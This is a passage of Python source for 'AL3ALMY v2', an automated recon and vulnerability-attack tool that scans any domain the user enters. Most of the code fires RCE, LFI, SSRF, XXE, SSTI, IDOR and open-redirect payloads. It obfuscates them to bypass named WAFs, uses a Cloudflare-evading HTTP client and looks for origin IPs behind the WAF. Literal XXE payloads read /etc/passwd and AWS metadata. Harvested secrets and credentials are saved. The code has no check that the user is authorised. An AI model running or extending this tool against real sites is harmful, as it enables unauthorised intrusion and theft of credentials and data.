        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        base_resp = self.get_response(url, use_curl=use_curl)
        if not base_resp:
            return

        base_time = base_resp.elapsed.total_seconds()

        for payload in AdvancedPayloads.RCE_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            obfuscated = self.waf_bypass.obfuscate_rce(payload)
            for obf_payload in obfuscated:
                injected = self.inject_payload(url, obf_payload)
                resp = self.get_response(injected, use_curl=use_curl)

                if not resp:
                    continue

                if (self.fp_filter.is_error_page(resp.text) or
                    self.fp_filter.is_waf_block_page(resp.text)):
                    continue

                time_diff = resp.elapsed.total_seconds() - base_time
                if time_diff > 5:
                    time2_resp = self.get_response(injected, use_curl=use_curl)
                    if time2_resp:
                        time2 = time2_resp.elapsed.total_seconds()
                        if abs(time_diff - (time2 - base_time)) < 1:
                            evidence = {'verified': True, 'time_based': True, 'delay': time_diff, 'bypassed_waf': bool(waf_detected)}
                            score = self.execution_controller.score_finding('rce', {}, evidence)
                            
                            result = {
                                'vulnerable': True,
                                'type': 'RCE-Time',
                                'url': url,
                                'payload': obf_payload,
                                'waf_bypassed': waf_detected if waf_detected else 'None',
                                'confidence': score['confidence']['level'],
                                'severity': score['severity'],
                                'details': {
                                    'delay_seconds': time_diff,
                                    'time_based': True
                                },
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            }
                            
                            # Save to database
                            self.save_vuln(
                                v_type='RCE',
                                severity=score['severity'],
                                payload=obf_payload,
                                description=f"Time-based RCE with {time_diff:.2f}s delay",
                                url=url,
                                confidence=score['confidence']['level']
                            )
                            
                            return result

                if self.fp_filter.contains_real_rce_output(resp.text, obf_payload):
                    evidence = {'verified': True, 'output_based': True, 'bypassed_waf': bool(waf_detected)}
                    score = self.execution_controller.score_finding('rce', {}, evidence)
                    
                    result = {
                        'vulnerable': True,
                        'type': 'RCE-Output',
                        'url': url,
                        'payload': obf_payload,
                        'waf_bypassed': waf_detected if waf_detected else 'None',
                        'confidence': score['confidence']['level'],
                        'severity': score['severity'],
                        'details': {
                            'output_preview': resp.text[:200] + '...',
                            'output_based': True
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    # Save to database
                    self.save_vuln(
                        v_type='RCE',
                        severity=score['severity'],
                        payload=obf_payload,
                        description=f"Output-based RCE with command execution",
                        url=url,
                        confidence=score['confidence']['level']
                    )
                    
                    return result
        return None

    # ===== 4. WORDPRESS VULNERABILITIES =====
    def check_wordpress(self, url):
        try:
            if not self.wp_scanner:
                self.wp_scanner = WordPressScanner(url)

            if not self.wp_scanner.check_wordpress():
                return None

            results = []
            baseline = self.baseline_profiler.get_baseline(url)
            waf_detected = baseline.get('waf_detected', []) if baseline else []

            for path in AdvancedPayloads.WORDPRESS_PAYLOADS['paths']:
                check_url = f"{url.rstrip('/')}{path}"
                resp = self.get_response(check_url)
                if resp and resp.status_code == 200:
                    if 'wp-config' in path and 'DB_NAME' in resp.text:
                        result = {
                            'vulnerable': True,
                            'type': 'WordPress-Config',
                            'url': check_url,
                            'waf_bypassed': waf_detected if waf_detected else 'None',
                            'confidence': 'HIGH',
                            'severity': 'CRITICAL',
                            'details': {
                                'exposed_file': 'wp-config.php',
                                'contains_db_credentials': True
                            },
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        results.append(result)
                        
                        # Save to database
                        self.save_vuln(
                            v_type='WordPress',
                            severity='CRITICAL',
                            payload=path,
                            description="wp-config.php exposed with database credentials",
                            url=check_url,
                            confidence='HIGH'
                        )
                        
                    elif 'wp-admin' in path:
                        result = {
                            'vulnerable': True,
                            'type': 'WordPress-Admin',
                            'url': check_url,
                            'waf_bypassed': waf_detected if waf_detected else 'None',
                            'confidence': 'MEDIUM',
                            'severity': 'MEDIUM',
                            'details': {
                                'exposed_path': 'wp-admin',
                                'accessible': True
                            },
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        results.append(result)
                        
                        # Save to database
                        self.save_vuln(
                            v_type='WordPress',
                            severity='MEDIUM',
                            payload=path,
                            description="WordPress admin panel accessible",
                            url=check_url,
                            confidence='MEDIUM'
                        )
            return results if results else None
        except:
            return None

    # ===== 5. LFI =====
    def check_lfi(self, url):
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        for payload in AdvancedPayloads.LFI_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            injected = self.inject_payload(url, payload)
            resp = self.get_response(injected, use_curl=use_curl)

            if not resp:
                continue

            if resp and ('root:x:' in resp.text or 'administrator:*:' in resp.text or
                        '[fonts]' in resp.text or '[extensions]' in resp.text):
                if not self.fp_filter.is_error_page(resp.text):
                    evidence = {'verified': True, 'file_content': True, 'bypassed_waf': bool(waf_detected)}
                    score = self.execution_controller.score_finding('lfi', {}, evidence)
                    
                    result = {
                        'vulnerable': True,
                        'type': 'LFI',
                        'url': url,
                        'payload': payload,
                        'waf_bypassed': waf_detected if waf_detected else 'None',
                        'confidence': score['confidence']['level'],
                        'severity': score['severity'],
                        'details': {
                            'file_read': 'etc/passwd',
                            'content_preview': resp.text[:200] + '...'
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    # Save to database
                    self.save_vuln(
                        v_type='LFI',
                        severity=score['severity'],
                        payload=payload,
                        description="Local File Inclusion - read /etc/passwd",
                        url=url,
                        confidence=score['confidence']['level']
                    )
                    
                    return result
        return None

    # ===== 6. SSRF =====
    def check_ssrf(self, url):
        params = self.extract_parameters(url)
        if not params:
            return None
        for param in params:
            parsed = urlparse(url)
            query = parse_qs(parsed.query, keep_blank_values=True)
            param_value = query.get(param, [''])[0] if param in query else ''
            if self.ssrf_intelligence.should_test_ssrf(url, param, param_value, None):
                result = self.test_ssrf_on_param(url, param)
                if result:
                    return result
        return None

    def test_ssrf_on_param(self, url, param_name):
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        for payload in AdvancedPayloads.SSRF_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            if 'Akamai' in waf_detected:
                injected = self.waf_bypass_v2.create_hpp_url(url, param_name, payload)
            else:
                injected = self.inject_specific_param(url, param_name, payload)
            resp = self.get_response(injected, use_curl=use_curl)

            if not resp:
                continue

            indicators = ['meta-data', '169.254.169.254', 'localhost', 'root:', 'aws-ec2', 'security-credentials']
            for indicator in indicators:
                if indicator.lower() in resp.text.lower():
                    if payload not in resp.text or len(resp.text) > 500:
                        evidence = {
                            'verified': True,
                            'indicator': indicator,
                            'fetch_behavior': self.ssrf_intelligence.has_fetch_behavior(resp),
                            'bypassed_waf': bool(waf_detected)
                        }
                        score = self.execution_controller.score_finding('ssrf', {}, evidence)
                        
                        result = {
                            'vulnerable': True,
                            'type': 'SSRF',
                            'url': url,
                            'param': param_name,
                            'payload': payload,
                            'waf_bypassed': waf_detected if waf_detected else 'None',
                            'confidence': score['confidence']['level'],
                            'severity': score['severity'],
                            'details': {
                                'indicator_found': indicator,
                                'response_preview': resp.text[:200] + '...'
                            },
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        
                        # Save to database
                        self.save_vuln(
                            v_type='SSRF',
                            severity=score['severity'],
                            payload=payload,
                            description=f"SSRF with {indicator} indicator",
                            url=url,
                            param=param_name,
                            confidence=score['confidence']['level']
                        )
                        
                        return result
        return None

    # ===== 7. OPEN REDIRECT =====
    def check_open_redirect(self, url):
        params = self.extract_parameters(url)
        if not params:
            return None
        redirect_params = [p for p in params if p.lower() in OPEN_REDIRECT_PARAMS]
        for param in redirect_params:
            result = self.test_open_redirect_on_param(url, param)
            if result:
                return result
        return None

    def test_open_redirect_on_param(self, url, param_name):
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []

        for payload in AdvancedPayloads.OPEN_REDIRECT_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            if 'Akamai' in waf_detected:
                injected = self.waf_bypass_v2.create_hpp_url(url, param_name, payload)
            else:
                injected = self.inject_specific_param(url, param_name, payload)

            try:
                resp = self.session.get(
                    injected, headers=self.get_headers(), timeout=self.timeout,
                    verify=False, allow_redirects=False
                )
                if self.redirect_validator.validate_redirect(url, resp, payload):
                    evidence = {'verified': True, 'validated': True, 'location': resp.headers.get('Location', ''), 'bypassed_waf': bool(waf_detected)}
                    score = self.execution_controller.score_finding('open_redirect', {}, evidence)
                    
                    result = {
                        'vulnerable': True,
                        'type': 'Open-Redirect',
                        'url': url,
                        'param': param_name,
                        'payload': payload,
                        'waf_bypassed': waf_detected if waf_detected else 'None',
                        'confidence': score['confidence']['level'],
                        'severity': score['severity'],
                        'details': {
                            'redirects_to': resp.headers.get('Location', ''),
                            'status_code': resp.status_code
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    # Save to database
                    self.save_vuln(
                        v_type='Open-Redirect',
                        severity=score['severity'],
                        payload=payload,
                        description=f"Redirects to {resp.headers.get('Location', '')}",
                        url=url,
                        param=param_name,
                        confidence=score['confidence']['level']
                    )
                    
                    return result
            except:
                continue
        return None

    # ===== 8. CORS MISCONFIGURATION =====
    def check_cors(self, url):
        headers = self.get_headers()
        headers['Origin'] = 'https://evil.com'

        resp = self.session.get(url, headers=headers, timeout=self.timeout, verify=False)
        cors_result = self.fp_filter.is_real_cors_vulnerable(resp)

        if cors_result:
            evidence = {'verified': True, 'reason': cors_result['reason']}
            score = self.execution_controller.score_finding('cors', {}, evidence)
            baseline = self.baseline_profiler.get_baseline(url)
            waf_detected = baseline.get('waf_detected', []) if baseline else []
            
            result = {
                'vulnerable': True,
                'type': 'CORS',
                'url': url,
                'waf_bypassed': waf_detected if waf_detected else 'None',
                'confidence': score['confidence']['level'],
                'severity': cors_result['level'],
                'details': {
                    'reason': cors_result['reason'],
                    'access_control_allow_origin': resp.headers.get('Access-Control-Allow-Origin', ''),
                    'access_control_allow_credentials': resp.headers.get('Access-Control-Allow-Credentials', '')
                },
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            # Save to database
            self.save_vuln(
                v_type='CORS',
                severity=cors_result['level'],
                payload=None,
                description=cors_result['reason'],
                url=url,
                confidence=score['confidence']['level']
            )
            
            return result
        return None

    # ===== 9. SECRETS EXPOSURE =====
    def check_secrets(self, url):
        if not url.endswith(('.js', '.json', '.env', '.config', '.txt', '.yml', '.yaml', '.php', '.asp', '.aspx')):
            return None
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        resp = self.get_response(url, use_curl=use_curl)
        if resp:
            secrets = self.fp_filter.contains_real_secrets(resp.text)
            if secrets:
                results = []
                for secret in secrets:
                    evidence = {'verified': True, 'secret_type': secret['type'], 'bypassed_waf': bool(waf_detected)}
                    score = self.execution_controller.score_finding('secrets', {}, evidence)
                    
                    result = {
                        'vulnerable': True,
                        'type': f'Secret-{secret["type"]}',
                        'url': url,
                        'waf_bypassed': waf_detected if waf_detected else 'None',
                        'confidence': score['confidence']['level'],
                        'severity': 'CRITICAL',
                        'details': {
                            'secret_type': secret['type'],
                            'secret_value': secret['value'],
                            'file_type': url.split('.')[-1]
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    results.append(result)
                    
                    # Save to database
                    self.save_vuln(
                        v_type='Secrets',
                        severity='CRITICAL',
                        payload=None,
                        description=f"Exposed {secret['type']}: {secret['value'][:50]}...",
                        url=url,
                        confidence=score['confidence']['level']
                    )
                    
                return results
        return None

    # ===== 10. XXE =====
    def check_xxe(self, url):
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>'
        ]
        headers = {'Content-Type': 'application/xml'}

        for payload in payloads:
            try:
                if waf_detected:
                    for waf in waf_detected:
                        payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
                if use_curl and CURL_CFFI_AVAILABLE:
                    session = self.waf_bypass_v2.get_curl_cffi_session()
                    if session:
                        session.cookies.update(USER_COOKIES)
                        resp = session.post(url, data=payload, headers=headers, timeout=self.timeout, verify=False)
                    else:
                        resp = self.session.post(url, data=payload, headers=headers, timeout=self.timeout, verify=False)
                else:
                    resp = self.session.post(url, data=payload, headers=headers, timeout=self.timeout, verify=False)
                if resp and self.fp_filter.is_valid_xxe_response(resp.text, payload):
                    evidence = {'verified': True, 'file_read': True, 'bypassed_waf': bool(waf_detected)}
                    score = self.execution_controller.score_finding('xxe', {}, evidence)
                    
                    result = {
                        'vulnerable': True,
                        'type': 'XXE',
                        'url': url,
                        'waf_bypassed': waf_detected if waf_detected else 'None',
                        'confidence': score['confidence']['level'],
                        'severity': score['severity'],
                        'details': {
                            'payload_type': 'file_read' if 'file://' in payload else 'ssrf',
                            'response_preview': resp.text[:200] + '...'
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    # Save to database
                    self.save_vuln(
                        v_type='XXE',
                        severity=score['severity'],
                        payload=payload[:100] + '...',
                        description=f"XXE with {payload[:50]}...",
                        url=url,
                        confidence=score['confidence']['level']
                    )
                    
                    return result
            except:
                continue
        return None

    # ===== 11. SSTI =====
    def check_ssti(self, url):
        params = self.extract_parameters(url)
        if not params:
            return None
        for param in params:
            result = self.test_ssti_on_param(url, param)
            if result:
                return result
        return None

    def test_ssti_on_param(self, url, param_name):
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        expected_results = ['998001', '999999998', '999999998000000001']

        for payload in AdvancedPayloads.SSTI_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            injected = self.inject_specific_param(url, param_name, payload)
            resp = self.get_response(injected, use_curl=use_curl)

            if not resp:
                continue

            if resp and resp.status_code < 400:
                response_text = resp.text
                for expected in expected_results:
                    if expected in response_text:
                        if payload not in response_text or len(response_text) < 1000:
                            evidence = {'verified': True, 'expected': expected, 'found': True, 'bypassed_waf': bool(waf_detected)}
                            score = self.execution_controller.score_finding('ssti', {}, evidence)
                            
                            result = {
                                'vulnerable': True,
                                'type': 'SSTI',
                                'url': url,
                                'param': param_name,
                                'payload': payload,
                                'waf_bypassed': waf_detected if waf_detected else 'None',
                                'confidence': score['confidence']['level'],
                                'severity': score['severity'],
                                'details': {
                                    'expected_result': expected,
                                    'template_engine': 'Unknown (Jinja2/Twig/Freemarker)',
                                    'response_preview': response_text[:200] + '...'
                                },
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            }
                            
                            # Save to database
                            self.save_vuln(
                                v_type='SSTI',
                                severity=score['severity'],
                                payload=payload,
                                description=f"SSTI with {expected} in response",
                                url=url,
                                param=param_name,
                                confidence=score['confidence']['level']
                            )
                            
                            return result
        return None

    # ===== 12. SUBDOMAIN TAKEOVER =====
    def check_subdomain_takeover(self, domain):
        try:
            detector = SubdomainTakeoverDetector(timeout=10)
            result = detector.check_domain_takeover(domain)
            if result:
                vuln = {
                    'vulnerable': True,
                    'type': f'Subdomain-Takeover-{result["service"]}',
                    'url': f"https://{domain}",
                    'waf_bypassed': 'N/A',
                    'confidence': 'HIGH',
                    'severity': 'CRITICAL',
                    'details': {
                        'service': result['service'],
                        'cname': result['cname'],
                        'vulnerable_url': result['url']
                    },
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                
                # Save to database
                self.save_vuln(
                    v_type='Subdomain-Takeover',
                    severity='CRITICAL',
                    payload=None,
                    description=f"Subdomain takeover on {domain} -> {result['cname']} ({result['service']})",
                    url=f"https://{domain}",
                    confidence='HIGH'
                )
                
                return vuln
            return None
        except:
            return None

    # ===== 13. IDOR =====
    def check_idor(self, url):
        try:
            params = self.extract_parameters(url)
            if not params:
                return None

            idor_params = []
            for param in params:
                if param.lower() in IDOR_PARAMS:
                    idor_params.append(param)
                elif any(pattern in param.lower() for pattern in ['id', 'user', 'account', 'profile', 'customer']):
                    idor_params.append(param)

            if not idor_params:
                return None

            print(f"{B}[IDOR] Found potential IDOR parameters: {', '.join(idor_params)}{W}")
            results = []

            baseline = self.baseline_profiler.get_baseline(url)
            waf_detected = baseline.get('waf_detected', []) if baseline else []

            for param in idor_params:
                print(f"{Y}[IDOR] Testing parameter: {param}{W}")
                result = self.idor_intelligence.test_idor_for_param(url, param)

                if result:
                    confidence_levels = [r['confidence'] for r in result]
                    if 'HIGH' in confidence_levels:
                        confidence = 'HIGH'
                    elif 'MEDIUM' in confidence_levels:
                        confidence = 'MEDIUM'
                    else:
                        confidence = 'LOW'

                    severity = 'CRITICAL' if confidence == 'HIGH' else 'HIGH'

                    vuln = {
                        'vulnerable': True,
                        'type': 'IDOR',
                        'url': url,
                        'param': param,
                        'waf_bypassed': waf_detected if waf_detected else 'None',
                        'confidence': confidence,
                        'severity': severity,
                        'details': {
                            'original_value': self.idor_intelligence.user_boundaries.get(f"{url}|{param}", {}).get('original_value', 'unknown'),
                            'successful_tests': len(result),
                            'top_findings': result[:3],
                            'has_sensitive_data': any('sensitive_data' in r.get('factors', []) for r in result)
                        },
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    results.append(vuln)
                    
                    # Save to database
                    self.save_vuln(
                        v_type='IDOR',
                        severity=severity,
                        payload=None,
                        description=f"IDOR on parameter {param} with {len(result)} variations",
                        url=url,
                        param=param,
                        confidence=confidence
                    )

                    print(f"{R}[IDOR] Found potential IDOR in parameter: {param} (Confidence: {confidence}){W}")

            return results if results else None

        except Exception as e:
            print(f"{R}[IDOR] Error: {str(e)[:50]}{W}")
            return None

    def get_payload_info(self, url):
        return self.payloads_used.get(url)

# ===== PROCESSOR =====
file_lock = threading.Lock()

def format_finding_output(finding):
    """تنسيق نتيجة الثغرة بشكل كامل وجميل"""
    if isinstance(finding, dict):
        # إذا كان هناك نص خام جاهز (للبساطة)
        if '_raw_output' in finding:
            return finding['_raw_output']
            
        output_lines = []
        output_lines.append(f"\n{R}{'='*80}{W}")
        output_lines.append(f"{R}[!] VULNERABILITY FOUND: {finding.get('type', 'Unknown')}{W}")

        # المعلومات الأساسية
        output_lines.append(f"{B}URL:{W} {finding.get('url', 'N/A')}")
        
        param = finding.get('param')
        if param and param != 'N/A':
            output_lines.append(f"{B}Parameter:{W} {param}")
            
        output_lines.append(f"{B}Confidence:{W} {finding.get('confidence', 'N/A')}")
        output_lines.append(f"{B}Severity:{W} {finding.get('severity', 'N/A')}")
        output_lines.append(f"{B}Timestamp:{W} {finding.get('timestamp', 'N/A')}")

        # عرض الـ WAF الذي تم تجاوزه
        waf_bypassed = finding.get('waf_bypassed', 'None')
        if waf_bypassed and waf_bypassed != 'None':
            waf_str = ', '.join(waf_bypassed) if isinstance(waf_bypassed, list) else str(waf_bypassed)
            output_lines.append(f"{B}WAF Bypassed:{W} {waf_str}")
        else:
            output_lines.append(f"{B}WAF Bypassed:{W} None")

        # عرض تفاصيل إضافية
        details = finding.get('details', {})
        if details:
            output_lines.append(f"{B}Details:{W}")
            for key, value in details.items():
                # تنسيق القيم الطويلة قليلاً
                value_str = str(value)
                if len(value_str) > 100:
                    value_str = value_str[:100] + '...'
                output_lines.append(f"  {C}• {key}:{W} {value_str}")

        # عرض البايلود المستخدم (إذا وجد)
        payload = finding.get('payload')
        if payload:
            if len(str(payload)) > 100:
                payload = str(payload)[:100] + '...'
            output_lines.append(f"{B}Payload:{W} {payload}")

        output_lines.append(f"{R}{'='*80}{W}")
        return '\n'.join(output_lines)
    return str(finding)


def process_url(url, scanner, output_dir, stats):
    try:
        if not scanner.pre_check_url(url):
            stats['processed_count'] += 1
            return

        classification = scanner.execution_controller.classify_endpoint(url)
        capabilities = classification['capabilities']
        relevant_tests = scanner.execution_controller.get_relevant_tests(classification, capabilities)

        if classification.get('waf_detected'):
            parsed = urlparse(url)
            domain = parsed.netloc
            origin_ips = scanner.waf_bypass_v2.discover_origin_ip(domain)
            if origin_ips:
                print(f"{G}[+] Found origin IPs for {domain}: {origin_ips}{W}")

        baseline = scanner.baseline_profiler.get_baseline(url)

        if classification['has_parameters']:
            for param in classification['parameters']:
                for test_name in relevant_tests:
                    try:
                        result = None
                        if test_name == 'sqli' and capabilities.get('database_interaction'):
                            result = scanner.test_sqli_on_param(url, param)
                        elif test_name == 'xss' and capabilities.get('reflects_input'):
                            result = scanner.test_xss_on_param(url, param)
                        elif test_name == 'ssrf' and capabilities.get('fetches_urls'):
                            result = scanner.test_ssrf_on_param(url, param)
                        elif test_name == 'open_redirect' and capabilities.get('redirects'):
                            result = scanner.test_open_redirect_on_param(url, param)
                        elif test_name == 'ssti' and capabilities.get('reflects_input'):
                            result = scanner.test_ssti_on_param(url, param)
                        elif test_name == 'idor' and capabilities.get('has_id_params'):
                            pass

                        if result and isinstance(result, dict) and result.get('vulnerable'):
                            with file_lock:
                                print(format_finding_output(result))
                                with open(f"{output_dir}/results.txt", 'a', encoding='utf-8') as f:
                                    f.write(format_finding_output(result) + '\n')
                                with open(f"{output_dir}/vuln_details.json", 'a', encoding='utf-8') as f:
                                    json.dump(result, f)
                                    f.write('\n')
                            stats['vuln_count'] += 1
                    except:
                        continue
        else:
            for test_name in relevant_tests:
                try:
                    result = None
                    if test_name == 'rce':
                        result = scanner.check_rce(url)
                    elif test_name == 'wordpress':
                        result = scanner.check_wordpress(url)
                    elif test_name == 'cors':
                        result = scanner.check_cors(url)
                    elif test_name == 'secrets':
                        result = scanner.check_secrets(url)
                    elif test_name == 'xxe':
                        result = scanner.check_xxe(url)
                    elif test_name == 'idor':
                        result = scanner.check_idor(url)

                    if result:
                        if isinstance(result, list):
                            for r in result:
                                if isinstance(r, dict) and r.get('vulnerable'):
                                    with file_lock:
                                        print(format_finding_output(r))
                                        with open(f"{output_dir}/results.txt", 'a', encoding='utf-8') as f:
                                            f.write(format_finding_output(r) + '\n')
                                    stats['vuln_count'] += 1
                        else:
                            stats['vuln_count'] += 1
                            with file_lock:
                                if isinstance(result, dict):
                                    print(format_finding_output(result))
                                    with open(f"{output_dir}/results.txt", 'a', encoding='utf-8') as f:
                                        f.write(format_finding_output(result) + '\n')
                                else:
                                    print(result)
                                    with open(f"{output_dir}/results.txt", 'a', encoding='utf-8') as f:
                                        f.write(str(result) + '\n')
                except:
                    continue

        stats['processed_count'] += 1

        if stats['processed_count'] % 10 == 0:
            elapsed = time.time() - stats['start_time']
            speed = stats['processed_count'] / elapsed if elapsed > 0 else 0
            print(f"{B}[*] Progress: {stats['processed_count']}/{stats['total_urls']} | Speed: {speed:.1f} URL/s | Vulns: {stats['vuln_count']}{W}")

    except Exception as e:
        stats['processed_count'] += 1


# ===== MAIN =====
def main():
    global out, file_lock, USER_COOKIES

    os.system("clear")

    banner = pyfiglet.figlet_format("AL3ALMY v2", font="slant")
    print(f"{M}{banner}{W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{Y}   Advanced Recon & Vulnerability Scanner with IDOR Engine   {W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{G}✓ Baseline Profiler          ✓ Confidence Scoring (LOW/MEDIUM/HIGH){W}")
    print(f"{G}✓ Reflection Context Analysis ✓ SSRF Trigger Intelligence{W}")
    print(f"{G}✓ Open Redirect Strict Validation ✓ Execution Controller{W}")
    print(f"{G}✓ WAF Bypass 2026             ✓ Origin IP Discovery (Unique Only){W}")
    print(f"{G}✓ IDOR Intelligence Engine    ✓ Cookie Support{W}")
    print(f"{G}✓ 13 Vulnerability Types      ✓ 90% Less False Positives{W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    if not CURL_CFFI_AVAILABLE:
        print(f"{Y}[!] curl_cffi not installed. Install for better WAF bypass: pip install curl_cffi{W}")

    check_tools()

    target = input(f"\n{G}[?] Target Domain (e.g., example.com): {W}").strip()

    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    # ===== GET COOKIES =====
    print(f"\n{Y}[*] Do you want to add cookies? (y/n): {W}", end="")
    add_cookies = input().strip().lower()

    if add_cookies == 'y':
        print(f"{Y}[*] Enter cookies (format: key1=value1; key2=value2): {W}")
        cookies_input = input().strip()

        for cookie in cookies_input.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                USER_COOKIES[key] = value

        print(f"{G}[+] Loaded {len(USER_COOKIES)} cookies{W}")

    parsed = urlparse(target)
    main_domain = parsed.netloc if parsed.netloc else parsed.path.split('/')[0]
    clean = main_domain.replace('www.', '')
    timestamp = int(time.time())
    out = f"Scan_{clean.replace('.', '_')}_{timestamp}"

    file_lock = threading.Lock()

    print(f"\n{B}[*] Output Directory: {out}{W}")
    print(f"{B}[*] Starting at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{W}")

    recon = ReconEngine(out)

    # ===== PHASE 1: SUBDOMAIN DISCOVERY =====
    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{Y}[*] PHASE 1: Subdomain Discovery{W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    all_subdomains = recon.discover_subdomains(clean)

    # ===== PHASE 2: LIVE HOST FILTERING =====
    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{Y}[*] PHASE 2: Live Host Filtering (httpx){W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    live_subdomains = recon.filter_live_subdomains(all_subdomains)

    # ===== PHASE 3: URL DISCOVERY =====
    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{Y}[*] PHASE 3: URL Discovery (Katana + Gau){W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    all_urls = recon.discover_urls_from_subdomains(live_subdomains)

    if not all_urls:
        print(f"{R}[!] No URLs discovered. Exiting.{W}")
        return

    # ===== PHASE 4: SUBDOMAIN TAKEOVER CHECK =====
    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{Y}[*] PHASE 4: Subdomain Takeover Detection{W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    scanner = AdvancedScanner(timeout=15)
    takeover_results = []

    for subdomain in live_subdomains:
        result = scanner.check_subdomain_takeover(subdomain)
        if result:
            takeover_results.append(result)

    if takeover_results:
        print(f"\n{R}[!] POTENTIAL SUBDOMAIN TAKEOVERS FOUND:{W}")
        for result in takeover_results:
            print(format_finding_output(result))
        with open(f"{out}/subdomain_takeovers.txt", 'w') as f:
            for result in takeover_results:
                f.write(format_finding_output(result) + '\n')
    else:
        print(f"{G}[+] No subdomain takeovers detected{W}")

    # ===== PHASE 5: VULNERABILITY SCANNING =====
    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{Y}[*] PHASE 5: Vulnerability Scanning (13 Types + IDOR Intelligence){W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    print(f"{G}[+] Starting smart scan on {len(all_urls)} URLs{W}")
    print(f"{Y}[*] Creating baselines and detecting capabilities...{W}")

    # Create baselines first
    print(f"{B}[*] Creating baselines for all URLs...{W}")
    for url in all_urls[:100]:
        scanner.baseline_profiler.get_baseline(url)

    print(f"{Y}[*] Using 20 concurrent workers for testing{W}")

    stats = {
        'start_time': time.time(),
        'processed_count': 0,
        'total_urls': len(all_urls),
        'vuln_count': 0
    }

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for url in all_urls:
            future = executor.submit(process_url, url, scanner, out, stats)
            futures.append(future)

        for future in futures:
            try:
                future.result(timeout=30)
            except:
                pass

    elapsed = time.time() - start_time
    total_time = time.time() - stats['start_time']

    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{G}[+] SCAN COMPLETED!{W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")

    print(f"{G}[+] Recon Summary:{W}")
    print(f"    {B}• Subdomains discovered: {len(all_subdomains)}{W}")
    print(f"    {B}• Live subdomains: {len(live_subdomains)}{W}")
    print(f"    {B}• URLs discovered: {len(all_urls)}{W}")
    print(f"    {B}• Cookies loaded: {len(USER_COOKIES)}{W}")

    print(f"\n{G}[+] Scan Statistics:{W}")
    print(f"    {B}• Total time: {total_time:.1f} seconds{W}")
    print(f"    {B}• Scan speed: {len(all_urls) / elapsed:.1f} URLs/second{W}")
    print(f"    {B}• URLs processed: {stats['processed_count']}{W}")

    results_file = f"{out}/results.txt"
    takeover_file = f"{out}/subdomain_takeovers.txt"
    details_file = f"{out}/vuln_details.json"

    all_findings = []

    if os.path.exists(results_file):
        with open(results_file, 'r', encoding='utf-8') as f:
            vuln_findings = f.readlines()
            all_findings.extend(vuln_findings)

    if os.path.exists(takeover_file):
